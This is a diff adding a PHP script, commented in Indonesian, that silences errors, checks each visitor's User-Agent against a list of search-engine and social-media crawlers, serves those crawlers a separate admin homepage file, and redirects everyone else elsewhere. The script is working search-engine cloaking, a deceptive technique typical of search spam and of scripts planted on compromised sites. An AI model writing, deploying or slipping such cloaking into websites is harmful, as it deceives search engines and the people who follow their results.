@@ -1,0 +1,39 @@
+
+<?php
+  // Matikan pelaporan error
+  error_reporting(0);
+
+  // Mengimpor koneksi ke database
+  include "config/koneksi.php";  // Memastikan koneksi ke database diimpor sesuai dengan skrip Anda
+
+  // Mendapatkan informasi user-agent dari request
+  $agent = $_SERVER['HTTP_USER_AGENT'];
+
+  // Daftar user-agent bot yang umum
+  $bots = [
+      'googlebot', 'bingbot', 'yandex', 'baiduspider', 'slurp', 'duckduckbot', 'sogou',
+      'facebook', 'twitterbot', 'instagram'
+  ];
+
+  // Fungsi untuk memeriksa apakah pengunjung adalah bot
+  function isBot($userAgent) {
+      global $bots;
+      foreach ($bots as $bot) {
+          if (stripos($userAgent, $bot) !== false) {
+              return true; // Jika ditemukan nama bot, return true
+          }
+      }
+      return false; // Jika tidak ditemukan, return false
+  }
+
+  // Jika pengunjung adalah bot
+  if (isBot($agent)) {
+      // Memuat homepage.php jika pengunjung adalah bot
+      include('adminweb/homepage.php');
+      exit; // Menghentikan eksekusi lebih lanjut setelah memuat homepage.php
+  }
+
+  // Jika bukan bot, alihkan pengguna ke URL yang ditentukan oleh base_url
+  header('location:'.$base_url); 
+  exit; // Menghentikan eksekusi lebih lanjut setelah pengalihan
+?>
